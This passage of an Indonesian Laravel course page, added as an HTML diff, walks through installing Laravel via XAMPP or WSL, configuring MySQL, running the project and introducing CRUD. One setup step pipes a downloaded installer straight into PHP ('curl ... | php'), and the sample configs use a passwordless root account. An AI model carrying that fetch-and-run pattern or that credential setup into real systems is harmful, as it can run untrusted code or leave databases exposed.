@@ -1,0 +1,2159 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Modul CRUD &amp; REST API &mdash; Laravel Sanctum</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --sidebar-w: 260px;
+      --toc-w: 220px;
+      --accent: #0d6efd;
+      --accent-light: #e7f1ff;
+      --text: #212529;
+      --muted: #6c757d;
+      --border: #dee2e6;
+      --code-bg: #f8f9fa;
+      --code-border: #e9ecef;
+      --sidebar-bg: #f8f9fa;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      font-size: 15px;
+      line-height: 1.7;
+      color: var(--text);
+      background: #fff;
+    }
+
+    /* TOP BAR */
+    .topbar {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+      height: 56px;
+      background: #fff;
+      border-bottom: 1px solid var(--border);
+      display: flex; align-items: center; padding: 0 24px;
+      gap: 16px;
+    }
+    .topbar-brand {
+      font-weight: 700; font-size: 17px; color: var(--accent);
+      text-decoration: none;
+    }
+    .topbar-version {
+      background: var(--accent-light); color: var(--accent);
+      font-size: 11px; font-weight: 600; padding: 2px 8px;
+      border-radius: 20px;
+    }
+    .topbar-subtitle {
+      color: var(--muted); font-size: 13px; margin-left: auto;
+    }
+    /* LARAVEL NAV BAR + SUB NAVBAR (dropdown by Fokus Utama) */
+    .laravel-nav { position: relative; margin-left: 24px; }
+    .laravel-nav-trigger {
+      display: flex; align-items: center; gap: 6px;
+      background: none; border: 1px solid var(--border); border-radius: 6px;
+      padding: 6px 14px; font-size: 13px; font-weight: 600;
+      color: var(--text); cursor: pointer; font-family: inherit;
+    }
+    .laravel-nav-trigger:hover { background: var(--accent-light); color: var(--accent); border-color: var(--accent); }
+    .laravel-nav.open .laravel-nav-trigger { background: var(--accent-light); color: var(--accent); border-color: var(--accent); }
+    .laravel-nav-trigger .caret { font-size: 10px; transition: transform .15s; }
+    .laravel-nav.open .laravel-nav-trigger .caret { transform: rotate(180deg); }
+    .laravel-nav-menu {
+      display: none;
+      position: absolute; top: calc(100% + 8px); left: 0;
+      width: 360px; max-height: 75vh; overflow-y: auto;
+      background: #fff; border: 1px solid var(--border); border-radius: 10px;
+      box-shadow: 0 12px 32px rgba(0,0,0,.14);
+      padding: 8px; z-index: 200;
+    }
+    .laravel-nav.open .laravel-nav-menu { display: block; }
+    .laravel-nav-item {
+      display: flex; align-items: center; gap: 10px;
+      padding: 9px 12px; border-radius: 8px;
+      text-decoration: none; color: var(--text); font-size: 13px;
+    }
+    .laravel-nav-item:hover { background: var(--accent-light); }
+    .laravel-nav-item.active { background: var(--accent-light); color: var(--accent); font-weight: 600; }
+    .laravel-nav-item .lni-week {
+      flex-shrink: 0; width: 34px; font-size: 11px; font-weight: 700; color: var(--muted);
+    }
+    .laravel-nav-item.active .lni-week { color: var(--accent); }
+    .laravel-nav-item .lni-title { flex: 1; }
+    .laravel-nav-item .lni-soon {
+      flex-shrink: 0; font-size: 10px; font-weight: 700; text-transform: uppercase;
+      background: #e9ecef; color: #495057; padding: 2px 6px; border-radius: 20px;
+    }
+
+    /* LAYOUT */
+    .layout {
+      display: flex;
+      padding-top: 56px;
+      min-height: 100vh;
+    }
+
+    /* LEFT SIDEBAR */
+    .sidebar {
+      width: var(--sidebar-w);
+      flex-shrink: 0;
+      position: fixed;
+      top: 56px; bottom: 0; left: 0;
+      overflow-y: auto;
+      background: var(--sidebar-bg);
+      border-right: 1px solid var(--border);
+      padding: 20px 0 40px;
+    }
+    .sidebar::-webkit-scrollbar { width: 4px; }
+    .sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+    .nav-group { margin-bottom: 4px; }
+    .nav-group-title {
+      display: flex; align-items: center; gap: 8px;
+      padding: 6px 20px;
+      font-size: 12px; font-weight: 700;
+      text-transform: uppercase; letter-spacing: .06em;
+      color: var(--text);
+      cursor: pointer;
+      user-select: none;
+    }
+    .nav-group-title .arrow {
+      display: inline-block; transition: transform .2s;
+      font-size: 10px; color: var(--muted);
+    }
+    .nav-group.open .arrow { transform: rotate(90deg); }
+    .nav-group-items { display: none; }
+    .nav-group.open .nav-group-items { display: block; }
+
+    .nav-link {
+      display: block;
+      padding: 5px 20px 5px 36px;
+      font-size: 14px; color: var(--muted);
+      text-decoration: none;
+      border-left: 3px solid transparent;
+      transition: color .15s, border-color .15s, background .15s;
+    }
+    .nav-link:hover { color: var(--accent); background: var(--accent-light); }
+    .nav-link.active {
+      color: var(--accent); font-weight: 600;
+      border-left-color: var(--accent);
+      background: var(--accent-light);
+    }
+
+    /* MAIN CONTENT */
+    .main {
+      margin-left: var(--sidebar-w);
+      margin-right: var(--toc-w);
+      flex: 1;
+      min-width: 0;
+    }
+    .main-inner {
+      max-width: 860px;
+      margin: 0 auto;
+      padding: 48px 56px;
+    }
+
+    /* MOBILE MENU TOGGLE */
+    .menu-toggle {
+      display: none;
+      align-items: center; justify-content: center;
+      width: 32px; height: 32px; flex-shrink: 0;
+      border: 1px solid var(--border); border-radius: 6px;
+      background: none; cursor: pointer; font-size: 16px;
+      color: var(--text);
+    }
+    .menu-toggle:hover { background: var(--accent-light); color: var(--accent); border-color: var(--accent); }
+    .sidebar-overlay {
+      display: none;
+      position: fixed; inset: 56px 0 0 0;
+      background: rgba(0,0,0,.35);
+      z-index: 95;
+    }
+    .sidebar-overlay.show { display: block; }
+
+    /* TABLES THAT OVERFLOW SCROLL INSTEAD OF BREAKING LAYOUT */
+    .table-scroll { overflow-x: auto; margin: 16px 0; -webkit-overflow-scrolling: touch; }
+    .table-scroll table { margin: 0; }
+
+    /* RESPONSIVE */
+    @media (max-width: 1300px) {
+      .toc { display: none; }
+      .main { margin-right: 0; }
+    }
+    @media (max-width: 900px) {
+      .menu-toggle { display: inline-flex; }
+      .topbar-subtitle { display: none; }
+      .sidebar {
+        transform: translateX(-100%);
+        transition: transform .2s ease;
+        z-index: 96;
+        box-shadow: 4px 0 24px rgba(0,0,0,.15);
+      }
+      .sidebar.open { transform: translateX(0); }
+      .main { margin-left: 0; }
+      .main-inner { padding: 32px 24px; }
+      .laravel-nav-menu { width: min(360px, 88vw); }
+    }
+    @media (max-width: 560px) {
+      .topbar { padding: 0 14px; gap: 10px; }
+      .topbar-brand { font-size: 15px; }
+      .topbar-version { display: none; }
+      .page-title { font-size: 28px; }
+      .page-lead { font-size: 15px; padding-bottom: 24px; margin-bottom: 28px; }
+      .main-inner { padding: 24px 16px; }
+      h2 { font-size: 21px; }
+    }
+
+    /* RIGHT TOC */
+    .toc {
+      width: var(--toc-w);
+      flex-shrink: 0;
+      position: fixed;
+      top: 56px; bottom: 0; right: 0;
+      overflow-y: auto;
+      padding: 24px 16px;
+      border-left: 1px solid var(--border);
+    }
+    .toc-title {
+      font-size: 11px; font-weight: 700;
+      text-transform: uppercase; letter-spacing: .06em;
+      color: var(--muted); margin-bottom: 12px;
+    }
+    .toc a {
+      display: block; font-size: 13px; color: var(--muted);
+      text-decoration: none; padding: 3px 0 3px 8px;
+      border-left: 2px solid transparent;
+      transition: color .15s, border-color .15s;
+    }
+    .toc a:hover, .toc a.active {
+      color: var(--accent); border-left-color: var(--accent);
+    }
+    .toc a.sub { padding-left: 20px; font-size: 12px; }
+
+    /* CONTENT TYPOGRAPHY */
+    .page-title {
+      font-size: 40px; font-weight: 700;
+      margin-bottom: 12px; line-height: 1.2;
+    }
+    .page-lead {
+      font-size: 18px; color: var(--muted);
+      margin-bottom: 40px; border-bottom: 1px solid var(--border);
+      padding-bottom: 32px;
+    }
+    .section { margin-bottom: 56px; }
+    h2 {
+      font-size: 26px; font-weight: 700;
+      margin-bottom: 16px; padding-top: 8px;
+      border-bottom: 1px solid var(--border);
+      padding-bottom: 8px;
+    }
+    h3 {
+      font-size: 18px; font-weight: 600;
+      margin: 24px 0 10px;
+    }
+    h4 {
+      font-size: 15px; font-weight: 600;
+      margin: 18px 0 8px; color: var(--text);
+    }
+    p { margin-bottom: 14px; }
+    ul, ol { padding-left: 24px; margin-bottom: 14px; }
+    li { margin-bottom: 6px; }
+    strong { font-weight: 600; }
+
+    /* CODE */
+    code {
+      font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+      font-size: 13px;
+      background: var(--code-bg);
+      border: 1px solid var(--code-border);
+      padding: 1px 5px; border-radius: 4px;
+      color: #d63384;
+    }
+    pre {
+      background: #1e1e2e;
+      border-radius: 8px;
+      padding: 20px 24px;
+      overflow-x: auto;
+      margin: 16px 0 20px;
+      position: relative;
+    }
+    pre code {
+      background: none; border: none; padding: 0;
+      color: #cdd6f4; font-size: 13px; line-height: 1.65;
+    }
+    .pre-label {
+      font-size: 11px; font-weight: 700;
+      text-transform: uppercase; letter-spacing: .06em;
+      color: #6c757d; margin-bottom: 6px;
+    }
+
+    /* COPY BUTTON */
+    .copy-btn {
+      position: absolute; top: 10px; right: 10px;
+      display: flex; align-items: center; gap: 5px;
+      background: rgba(255,255,255,.08);
+      color: #cdd6f4;
+      border: 1px solid rgba(255,255,255,.18);
+      border-radius: 6px;
+      font-family: inherit; font-size: 11px; font-weight: 600;
+      padding: 4px 9px;
+      cursor: pointer;
+      opacity: .55;
+      transition: opacity .15s, background .15s;
+    }
+    pre:hover .copy-btn, .copy-btn:focus-visible { opacity: 1; }
+    .copy-btn:hover { background: rgba(255,255,255,.2); }
+    .copy-btn.copied {
+      opacity: 1; background: #198754; border-color: #198754; color: #fff;
+    }
+    @media (max-width: 900px) { .copy-btn { opacity: .8; } }
+    @media print { .copy-btn { display: none; } }
+
+    .kw  { color: #cba6f7; }
+    .fn  { color: #89b4fa; }
+    .str { color: #a6e3a1; }
+    .cm  { color: #6c7086; }
+    .cl  { color: #fab387; }
+    .nb  { color: #89dceb; }
+    .op  { color: #89dceb; }
+
+    /* BADGES / CALLOUTS */
+    .badge {
+      display: inline-block; font-size: 11px; font-weight: 700;
+      padding: 2px 8px; border-radius: 4px;
+      text-transform: uppercase; letter-spacing: .04em;
+    }
+    .badge-blue  { background: #cfe2ff; color: #084298; }
+    .badge-green { background: #d1e7dd; color: #0a3622; }
+    .badge-red   { background: #f8d7da; color: #842029; }
+    .badge-yellow{ background: #fff3cd; color: #664d03; }
+    .badge-purple{ background: #e8d5fb; color: #5e2d91; }
+    .badge-orange{ background: #ffe5d0; color: #8a3800; }
+
+    .callout {
+      border-left: 4px solid var(--accent);
+      background: var(--accent-light);
+      padding: 14px 18px; border-radius: 0 6px 6px 0;
+      margin: 16px 0;
+    }
+    .callout.warning { border-left-color: #ffc107; background: #fff3cd; }
+    .callout.danger  { border-left-color: #dc3545; background: #f8d7da; }
+    .callout.success { border-left-color: #198754; background: #d1e7dd; }
+    .callout-title { font-weight: 700; margin-bottom: 4px; font-size: 13px; }
+
+    /* TABLE */
+    table {
+      width: 100%; border-collapse: collapse;
+      margin: 16px 0; font-size: 14px;
+    }
+    th {
+      background: var(--code-bg); font-weight: 600;
+      padding: 10px 14px; border: 1px solid var(--border);
+      text-align: left;
+    }
+    td { padding: 9px 14px; border: 1px solid var(--border); }
+    tr:nth-child(even) td { background: #fafafa; }
+
+    /* STEP LIST */
+    .step-list { list-style: none; padding: 0; }
+    .step-list li { display: flex; gap: 16px; margin-bottom: 20px; }
+    .step-num {
+      flex-shrink: 0;
+      width: 28px; height: 28px;
+      background: var(--accent); color: #fff;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 13px; font-weight: 700; margin-top: 2px;
+    }
+    .step-body h4 { margin-top: 0; }
+
+    /* DIVIDER */
+    .divider { border: none; border-top: 2px solid var(--border); margin: 56px 0; }
+
+    /* PRINT */
+    @media print {
+      .topbar, .sidebar, .toc { display: none; }
+      .main { margin: 0; }
+      .main-inner { padding: 24px 32px; max-width: 100%; }
+      pre { background: #f8f9fa !important; }
+      pre code { color: #212529 !important; }
+      .kw,.fn,.str,.cm,.cl,.nb,.op { color: #212529 !important; }
+      h2 { page-break-before: always; }
+      .section:first-of-type h2 { page-break-before: avoid; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- TOP BAR -->
+<header class="topbar">
+  <button class="menu-toggle" id="menuToggle" aria-label="Buka menu">&#9776;</button>
+  <a class="topbar-brand" href="index.html">Laravel Docs</a>
+  <span class="topbar-version">v12.x</span>
+  <div class="laravel-nav" id="laravelNav">
+    <button class="laravel-nav-trigger" type="button">Laravel <span class="caret">&#9662;</span></button>
+    <div class="laravel-nav-menu">
+      <a class="laravel-nav-item active" href="modul-rest-api-sanctum.html"><span class="lni-week">M1</span><span class="lni-title">Core Laravel &amp; Database</span></a>
+      <a class="laravel-nav-item" href="modul-arsitektur-otorisasi.html"><span class="lni-week">M2</span><span class="lni-title">Arsitektur Kode &amp; Otorisasi</span></a>
+      <a class="laravel-nav-item" href="modul-optimasi.html"><span class="lni-week">M3</span><span class="lni-title">Testing &amp; Optimasi</span></a>
+      <a class="laravel-nav-item" href="modul-observability.html"><span class="lni-week">M4</span><span class="lni-title">Observability</span></a>
+      <a class="laravel-nav-item" href="modul-api-design-realtime.html"><span class="lni-week">M5</span><span class="lni-title">API Design &amp; Real-time</span></a>
+      <a class="laravel-nav-item" href="modul-security-deepdive.html"><span class="lni-week">M6</span><span class="lni-title">Security Deep-dive</span></a>
+      <a class="laravel-nav-item" href="modul-capstone-ecommerce.html"><span class="lni-week">M7</span><span class="lni-title">Capstone Project: E-commerce</span></a>
+      <a class="laravel-nav-item" href="modul-containerization-deployment.html"><span class="lni-week">M8</span><span class="lni-title">Containerization &amp; Deployment</span></a>
+      <a class="laravel-nav-item" href="modul-cloud-infrastructure.html"><span class="lni-week">M9</span><span class="lni-title">Cloud &amp; Infrastructure</span></a>
+      <a class="laravel-nav-item" href="modul-skala-besar.html"><span class="lni-week">M10</span><span class="lni-title">Skala Besar</span></a>
+      <a class="laravel-nav-item" href="modul-system-design.html"><span class="lni-week">M11</span><span class="lni-title">System Design</span></a>
+    </div>
+  </div>
+  <span class="topbar-subtitle">CRUD Produk &amp; REST API Sanctum &mdash; Modul Belajar</span>
+</header>
+
+<div class="layout">
+
+  <!-- LEFT SIDEBAR -->
+  <nav class="sidebar">
+
+    <div class="nav-group open">
+      <div class="nav-group-title"><span class="arrow">&#9654;</span> Instalasi Laravel</div>
+      <div class="nav-group-items">
+        <a class="nav-link active" href="#instalasi-persyaratan">Persyaratan</a>
+        <a class="nav-link" href="#instalasi-xampp">Install via XAMPP</a>
+        <a class="nav-link" href="#instalasi-wsl">Install via WSL</a>
+        <a class="nav-link" href="#instalasi-jalankan">Menjalankan Project</a>
+      </div>
+    </div>
+
+    <div class="nav-group open">
+      <div class="nav-group-title"><span class="arrow">&#9654;</span> CRUD Produk</div>
+      <div class="nav-group-items">
+        <a class="nav-link" href="#crud-intro">Pengenalan CRUD</a>
+        <a class="nav-link" href="#crud-migration">Migration</a>
+        <a class="nav-link" href="#crud-model">Model</a>
+        <a class="nav-link" href="#crud-controller">Controller</a>
+        <a class="nav-link" href="#crud-views">Views</a>
+        <a class="nav-link" href="#crud-routes">Routes</a>
+      </div>
+    </div>
+
+    <div class="nav-group open">
+      <div class="nav-group-title"><span class="arrow">&#9654;</span> Eloquent &amp; Relasi</div>
+      <div class="nav-group-items">
+        <a class="nav-link" href="#eloquent-dasar">Query Dasar Eloquent</a>
+        <a class="nav-link" href="#eloquent-relasi">Relasi Antar Model</a>
+      </div>
+    </div>
+
+    <div class="nav-group open">
+      <div class="nav-group-title"><span class="arrow">&#9654;</span> Query Optimization</div>
+      <div class="nav-group-items">
+        <a class="nav-link" href="#n-plus-one">Masalah N+1</a>
+        <a class="nav-link" href="#eager-loading">Eager Loading</a>
+        <a class="nav-link" href="#indexing">Indexing Dasar</a>
+      </div>
+    </div>
+
+    <div class="nav-group open">
+      <div class="nav-group-title"><span class="arrow">&#9654;</span> Getting Started</div>
+      <div class="nav-group-items">
+        <a class="nav-link" href="#pengenalan">Pengenalan REST API</a>
+        <a class="nav-link" href="#cara-kerja">Cara Kerja</a>
+        <a class="nav-link" href="#persiapan">Persiapan Project</a>
+      </div>
+    </div>
+
+    <div class="nav-group open">
+      <div class="nav-group-title"><span class="arrow">&#9654;</span> Instalasi &amp; Konfigurasi</div>
+      <div class="nav-group-items">
+        <a class="nav-link" href="#install-sanctum">Install Sanctum</a>
+        <a class="nav-link" href="#setup-user">Setup User Model</a>
+        <a class="nav-link" href="#setup-bootstrap">Bootstrap API</a>
+      </div>
+    </div>
+
+    <div class="nav-group open">
+      <div class="nav-group-title"><span class="arrow">&#9654;</span> Implementasi API</div>
+      <div class="nav-group-items">
+        <a class="nav-link" href="#auth-controller">Auth Controller</a>
+        <a class="nav-link" href="#produk-api">Produk API Controller</a>
+        <a class="nav-link" href="#api-routes">API Routes</a>
+      </div>
+    </div>
+
+    <div class="nav-group open">
+      <div class="nav-group-title"><span class="arrow">&#9654;</span> Testing &amp; Debugging</div>
+      <div class="nav-group-items">
+        <a class="nav-link" href="#test-postman">Test dengan Postman</a>
+        <a class="nav-link" href="#test-curl">Test dengan cURL</a>
+        <a class="nav-link" href="#error-umum">Error Umum &amp; Solusi</a>
+      </div>
+    </div>
+
+    <div class="nav-group open">
+      <div class="nav-group-title"><span class="arrow">&#9654;</span> Keamanan</div>
+      <div class="nav-group-items">
+        <a class="nav-link" href="#csrf">CSRF Protection</a>
+        <a class="nav-link" href="#xss">XSS Prevention</a>
+        <a class="nav-link" href="#sql-injection">SQL Injection</a>
+      </div>
+    </div>
+
+    <div class="nav-group open">
+      <div class="nav-group-title"><span class="arrow">&#9654;</span> Autentikasi Lanjutan</div>
+      <div class="nav-group-items">
+        <a class="nav-link" href="#jwt-alternatif">REST API &rarr; JWT</a>
+        <a class="nav-link" href="#ringkasan">Ringkasan Minggu 1</a>
+      </div>
+    </div>
+
+  </nav>
+
+  <div class="sidebar-overlay" id="sidebarOverlay"></div>
+
+  <!-- MAIN CONTENT -->
+  <main class="main">
+   <div class="main-inner">
+
+    <!-- ========== INSTALASI LARAVEL ========== -->
+    <div class="section" id="instalasi-persyaratan">
+      <h1 class="page-title">Minggu 1: Instalasi, CRUD &amp; REST API Laravel</h1>
+      <p class="page-lead">
+        Sebelum masuk ke CRUD dan REST API, siapkan dulu environment Laravel-nya.
+        Ada dua jalur yang bisa dipilih &mdash; <strong>XAMPP</strong> (Windows, serba GUI,
+        paling cepat untuk pemula) atau <strong>WSL</strong> (Linux di dalam Windows, lebih
+        mirip environment production). Pilih salah satu, tidak perlu dua-duanya.
+      </p>
+
+      <h2>Persyaratan</h2>
+      <table>
+        <thead><tr><th>Kebutuhan</th><th>Versi Minimum</th><th>Fungsi</th></tr></thead>
+        <tbody>
+          <tr><td>PHP</td><td>8.2+</td><td>Menjalankan Laravel</td></tr>
+          <tr><td>Composer</td><td>2.x</td><td>Manajer dependency PHP, dipakai untuk instal Laravel</td></tr>
+          <tr><td>Ekstensi PHP</td><td>&mdash;</td><td><code>mbstring</code>, <code>xml</code>, <code>curl</code>, <code>zip</code>, <code>bcmath</code>, <code>pdo_mysql</code></td></tr>
+          <tr><td>MySQL/MariaDB</td><td>8.x / 10.x</td><td>Database (opsional di awal, wajib untuk migration)</td></tr>
+          <tr><td>Node.js</td><td>18+</td><td>Compile asset frontend (Vite) &mdash; opsional untuk API-only</td></tr>
+        </tbody>
+      </table>
+      <div class="callout">
+        <div class="callout-title">Belum Tahu Mau Pilih yang Mana?</div>
+        <strong>XAMPP</strong> kalau baru mulai belajar Laravel dan ingin GUI (phpMyAdmin,
+        Apache tinggal klik start). <strong>WSL</strong> kalau sudah nyaman dengan terminal
+        Linux dan ingin environment yang mirip server production sungguhan.
+      </div>
+    </div>
+
+    <!-- INSTALASI XAMPP -->
+    <div class="section" id="instalasi-xampp">
+      <h2>Install Laravel via XAMPP</h2>
+
+      <h3>Langkah 1 &mdash; Install XAMPP</h3>
+      <p>Download XAMPP (sudah termasuk PHP, Apache, MySQL) dari <code>apachefriends.org</code>,
+        pilih versi dengan PHP 8.2 ke atas, lalu install seperti biasa (default <code>C:\xampp</code>).</p>
+
+      <h3>Langkah 2 &mdash; Tambahkan PHP ke PATH</h3>
+      <p>Supaya perintah <code>php</code> dan <code>composer</code> bisa dipanggil dari terminal
+        manapun, tambahkan folder PHP XAMPP ke environment variable <code>PATH</code> Windows.</p>
+      <div class="pre-label">Windows &mdash; Edit Environment Variables</div>
+      <pre><code><span class="cm"># Search "Environment Variables" di Start Menu →</span>
+<span class="cm"># Edit the system environment variables → Environment Variables</span>
+<span class="cm"># Pilih "Path" di User variables → Edit → New</span>
+C:\xampp\php</code></pre>
+      <div class="pre-label">Terminal (buka baru setelah edit PATH)</div>
+      <pre><code>php -v
+<span class="cm"># harus muncul: PHP 8.2.x (cli) ...</span></code></pre>
+
+      <h3>Langkah 3 &mdash; Install Composer</h3>
+      <p>Download <code>Composer-Setup.exe</code> dari <code>getcomposer.org</code>, jalankan
+        installer &mdash; secara otomatis mendeteksi PHP XAMPP di PATH.</p>
+      <div class="pre-label">Terminal</div>
+      <pre><code>composer -V
+<span class="cm"># harus muncul: Composer version 2.x.x</span></code></pre>
+
+      <h3>Langkah 4 &mdash; Buat Project Laravel di dalam htdocs</h3>
+      <div class="pre-label">Terminal</div>
+      <pre><code><span class="fn">cd</span> C:\xampp\htdocs
+composer create-project laravel/laravel laravel-crud-app</code></pre>
+      <div class="callout warning">
+        <div class="callout-title">Kenapa di dalam <code>htdocs</code>?</div>
+        Apache XAMPP hanya melayani file di dalam folder <code>htdocs</code>. Kalau project
+        dibuat di luar folder ini, kamu tetap bisa menjalankannya lewat <code>php artisan serve</code>
+        (lihat bagian Menjalankan Project), tapi tidak bisa diakses lewat Apache/virtual host.
+      </div>
+
+      <h3>Langkah 5 &mdash; Hubungkan ke MySQL XAMPP</h3>
+      <p>Start module <strong>Apache</strong> dan <strong>MySQL</strong> di XAMPP Control Panel,
+        lalu buat database baru lewat phpMyAdmin (<code>http://localhost/phpmyadmin</code>).</p>
+      <div class="pre-label">.env</div>
+      <pre><code>DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=laravel_crud_app
+DB_USERNAME=root
+DB_PASSWORD=</code></pre>
+      <div class="callout">
+        <div class="callout-title">Default XAMPP</div>
+        User <code>root</code> di MySQL XAMPP secara default <strong>tidak punya password</strong>
+        &mdash; kosongkan saja <code>DB_PASSWORD</code>.
+      </div>
+    </div>
+
+    <!-- INSTALASI WSL -->
+    <div class="section" id="instalasi-wsl">
+      <h2>Install Laravel via WSL</h2>
+      <p>WSL (Windows Subsystem for Linux) menjalankan Ubuntu asli di dalam Windows &mdash;
+        cocok kalau ingin environment development yang mirip server production (Linux).</p>
+
+      <h3>Langkah 1 &mdash; Aktifkan WSL2 &amp; Install Ubuntu</h3>
+      <div class="pre-label">PowerShell (Run as Administrator)</div>
+      <pre><code>wsl --install
+<span class="cm"># restart komputer setelah selesai, Ubuntu akan terbuka otomatis</span>
+<span class="cm"># buat username & password Linux saat diminta</span></code></pre>
+
+      <h3>Langkah 2 &mdash; Update &amp; Install PHP</h3>
+      <div class="pre-label">Terminal Ubuntu (WSL)</div>
+      <pre><code><span class="fn">sudo</span> apt update &amp;&amp; <span class="fn">sudo</span> apt upgrade -y
+<span class="fn">sudo</span> apt install php php-cli php-mbstring php-xml php-bcmath php-curl php-zip unzip -y
+
+php -v   <span class="cm"># pastikan versi 8.2+</span></code></pre>
+
+      <h3>Langkah 3 &mdash; Install Composer</h3>
+      <div class="pre-label">Terminal Ubuntu (WSL)</div>
+      <pre><code>curl -sS https://getcomposer.org/installer | php
+<span class="fn">sudo</span> mv composer.phar /usr/local/bin/composer
+
+composer -V</code></pre>
+
+      <h3>Langkah 4 &mdash; Buat Project Laravel</h3>
+      <div class="pre-label">Terminal Ubuntu (WSL)</div>
+      <pre><code><span class="fn">cd</span> ~
+composer create-project laravel/laravel laravel-crud-app
+<span class="fn">cd</span> laravel-crud-app</code></pre>
+      <div class="callout">
+        <div class="callout-title">Kenapa Simpan di Filesystem Linux (<code>~</code>), Bukan <code>/mnt/c/...</code>?</div>
+        Project yang disimpan di filesystem Linux asli (<code>/home/user/...</code>) jauh lebih
+        cepat dibaca/ditulis oleh <code>php artisan</code> dan <code>composer</code> dibanding
+        project yang diakses lewat <code>/mnt/c/</code> (disk Windows).
+      </div>
+
+      <h3>Langkah 5 &mdash; Database untuk WSL</h3>
+      <p>Ada dua opsi: install MySQL langsung di dalam WSL, atau pakai MySQL yang sudah
+        berjalan di XAMPP (Windows).</p>
+      <div class="pre-label">Opsi A — Install MySQL di dalam WSL</div>
+      <pre><code><span class="fn">sudo</span> apt install mysql-server php-mysql -y
+<span class="fn">sudo</span> service mysql start</code></pre>
+      <div class="pre-label">Opsi B — Pakai MySQL XAMPP di Windows (.env di WSL)</div>
+      <pre><code>DB_CONNECTION=mysql
+DB_HOST=127.0.0.1   <span class="cm"># WSL2 modern sudah bisa akses localhost Windows langsung</span>
+DB_PORT=3306
+DB_DATABASE=laravel_crud_app
+DB_USERNAME=root
+DB_PASSWORD=</code></pre>
+
+      <h3>Buka Project di VS Code</h3>
+      <div class="pre-label">Terminal Ubuntu (WSL), di dalam folder project</div>
+      <pre><code>code .
+<span class="cm"># install extension "WSL" di VS Code agar terhubung otomatis</span></code></pre>
+    </div>
+
+    <!-- MENJALANKAN PROJECT -->
+    <div class="section" id="instalasi-jalankan">
+      <h2>Menjalankan Project &amp; Verifikasi</h2>
+
+      <h3>Cara 1 &mdash; <code>php artisan serve</code> (berlaku untuk XAMPP maupun WSL)</h3>
+      <div class="pre-label">Terminal, di dalam folder project</div>
+      <pre><code>php artisan serve</code></pre>
+      <p>Buka <code>http://127.0.0.1:8000</code> di browser &mdash; kalau muncul halaman selamat
+        datang Laravel, instalasi berhasil.</p>
+
+      <h3>Cara 2 &mdash; Virtual Host Apache (khusus XAMPP)</h3>
+      <div class="pre-label">C:\xampp\apache\conf\extra\httpd-vhosts.conf</div>
+      <pre><code>&lt;VirtualHost *:80&gt;
+    DocumentRoot "C:/xampp/htdocs/laravel-crud-app/public"
+    ServerName laravel-crud-app.test
+    &lt;Directory "C:/xampp/htdocs/laravel-crud-app/public"&gt;
+        AllowOverride All
+        Require all granted
+    &lt;/Directory&gt;
+&lt;/VirtualHost&gt;</code></pre>
+      <div class="pre-label">C:\Windows\System32\drivers\etc\hosts</div>
+      <pre><code>127.0.0.1  laravel-crud-app.test</code></pre>
+      <p>Restart Apache di XAMPP Control Panel, lalu akses <code>http://laravel-crud-app.test</code>.</p>
+
+      <h3>Perbandingan XAMPP vs WSL</h3>
+      <table>
+        <thead><tr><th>Aspek</th><th>XAMPP</th><th>WSL</th></tr></thead>
+        <tbody>
+          <tr><td>Instalasi awal</td><td>Mudah, GUI installer</td><td>Command-line, sedikit lebih teknis</td></tr>
+          <tr><td>Database GUI</td><td>phpMyAdmin bawaan</td><td>Perlu install sendiri atau pakai TablePlus/DBeaver</td></tr>
+          <tr><td>Performa filesystem</td><td>Lebih lambat untuk project besar</td><td>Native Linux, lebih cepat</td></tr>
+          <tr><td>Mirip production server</td><td>Tidak (Windows + Apache GUI)</td><td>Ya (Ubuntu asli)</td></tr>
+          <tr><td>Cocok untuk</td><td>Pemula, belajar cepat</td><td>Yang ingin terbiasa dengan Linux</td></tr>
+        </tbody>
+      </table>
+
+      <div class="callout success">
+        <div class="callout-title">Siap Lanjut</div>
+        Setelah <code>php artisan serve</code> menampilkan halaman welcome Laravel tanpa error,
+        project siap dipakai untuk membangun CRUD Produk di bawah ini.
+      </div>
+    </div>
+
+    <!-- ========== CRUD PRODUK ========== -->
+    <div class="section" id="crud-intro">
+      <h2>Pengenalan CRUD</h2>
+      <p><strong>CRUD</strong> adalah empat operasi dasar: <strong>C</strong>reate, <strong>R</strong>ead,
+        <strong>U</strong>pdate, <strong>D</strong>elete. Di Laravel, semua operasi ini dikelola oleh satu
+        <strong>Resource Controller</strong> yang mengikuti konvensi RESTful.</p>
+      <table>
+        <thead><tr><th>Operasi</th><th>Method HTTP</th><th>URL</th><th>Method Controller</th></tr></thead>
+        <tbody>
+          <tr><td>Tampilkan semua</td><td><span class="badge badge-blue">GET</span></td><td><code>/produk</code></td><td><code>index()</code></td></tr>
+          <tr><td>Form tambah</td><td><span class="badge badge-blue">GET</span></td><td><code>/produk/create</code></td><td><code>create()</code></td></tr>
+          <tr><td>Simpan data baru</td><td><span class="badge badge-green">POST</span></td><td><code>/produk</code></td><td><code>store()</code></td></tr>
+          <tr><td>Form edit</td><td><span class="badge badge-blue">GET</span></td><td><code>/produk/{id}/edit</code></td><td><code>edit()</code></td></tr>
+          <tr><td>Update data</td><td><span class="badge badge-yellow">PUT</span></td><td><code>/produk/{id}</code></td><td><code>update()</code></td></tr>
+          <tr><td>Hapus data</td><td><span class="badge badge-red">DELETE</span></td><td><code>/produk/{id}</code></td><td><code>destroy()</code></td></tr>
+        </tbody>
+      </table>
+      <div class="callout success">
+        <div class="callout-title">Sudah Dibuat</div>
+        Project <code>laravel-crud-app</code> sudah memiliki CRUD produk yang berjalan.
+        Modul ini mendokumentasikan apa yang sudah dibangun agar kamu memahami setiap bagiannya
+        sebelum lanjut ke REST API.
+      </div>
+    </div>
+
+    <!-- MIGRATION -->
+    <div class="section" id="crud-migration">
+      <h2>Migration</h2>
+      <p>Migration adalah version control untuk database &mdash; mendefinisikan struktur tabel
+        dalam kode PHP agar bisa dijalankan di mesin apapun secara konsisten.</p>
+
+      <h3>Migration 1 &mdash; Buat Tabel Produks</h3>
